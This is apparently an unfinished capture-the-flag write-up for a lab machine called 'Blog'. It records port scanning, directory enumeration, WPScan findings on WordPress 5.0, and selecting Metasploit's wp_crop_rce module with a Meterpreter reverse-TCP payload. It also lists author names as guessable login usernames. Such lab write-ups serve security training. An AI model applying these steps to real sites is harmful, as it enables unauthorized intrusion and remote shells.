# Blog

## Objectives
1. root.txt 
```
```
2. user.txt
```
```
3. where was user.txt found?
```
```
4. what CMS is being used?
```
WordPress
```
5. version of CMS
```
5.0
```

nmap results - 
```
22
80
139
280
445
```
Add blog.thm in /etc/hosts with IP 

directory enumeration results - 
```
[19:20:28] 301 -    0B  - /0  ->  http://10.10.111.21/0/                    
[19:20:31] 301 -    0B  - /2020  ->  http://10.10.111.21/2020/              
[19:20:36] 301 -    0B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js  ->  http://10.10.111.21/Citrix/AccessPlatform/auth/clientscripts/cookies.js
[19:20:40] 301 -    0B  - /New%20folder%20(2)  ->  http://10.10.111.21/New%20folder%20(2
[19:20:40] 301 -    0B  - /PMA2/index.php  ->  http://10.10.111.21/PMA2/    
[19:20:40] 301 -    0B  - /PMA/index.php  ->  http://10.10.111.21/PMA/      
[19:21:03] 302 -    0B  - /admin  ->  http://blog.thm/wp-admin/
```
Powered by WordPress
```
Found WordPress version as 5.0 in source code
```
wp scan reveals there are 56 vulnerabilities in this insecure WordPress version.
```
 WordPress version 5.0 identified (Insecure, released on 2018-12-06).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.213.61/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.0'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.213.61/, Match: 'WordPress 5.0'
 |
 | [!] 56 vulnerabilities identified:

```
Firing up Metasploit Framework and searching for exploit 
```
msf6 > search wordpress 5.0

Matching Modules
================

   #  Name                                              Disclosure Date  Rank       Check  Description
   -  ----                                              ---------------  ----       -----  -----------
   0  exploit/multi/http/wp_crop_rce                    2019-02-19       excellent  Yes    WordPress Crop-image Shell Upload
   1  exploit/unix/webapp/wp_property_upload_exec       2012-03-26       excellent  Yes    WordPress WP-Property PHP File Upload Vulnerability
   2  auxiliary/scanner/http/wp_registrationmagic_sqli  2022-01-23       normal     Yes    Wordpress RegistrationMagic task_ids Authenticated SQLi


Interact with a module by name or index. For example info 2, use 2 or use auxiliary/scanner/http/wp_registrationmagic_sqli

msf6 > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(multi/http/wp_crop_rce) > options

Module options (exploit/multi/http/wp_crop_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       The WordPress password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   THEME_DIR                   no        The WordPress theme dir name (disable theme auto-detection if provided)
   USERNAME                    yes       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.29.229   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WordPress

```
We need wp-admin login username and password to gain RCE with this exploit

Since ports 139 and 445 are open, lets try enum4linux to see more data -
```

```
Manual browsing shows 2 author names -
```
bjoel
kwheel
```
Could possibly be usernames for wp-admin
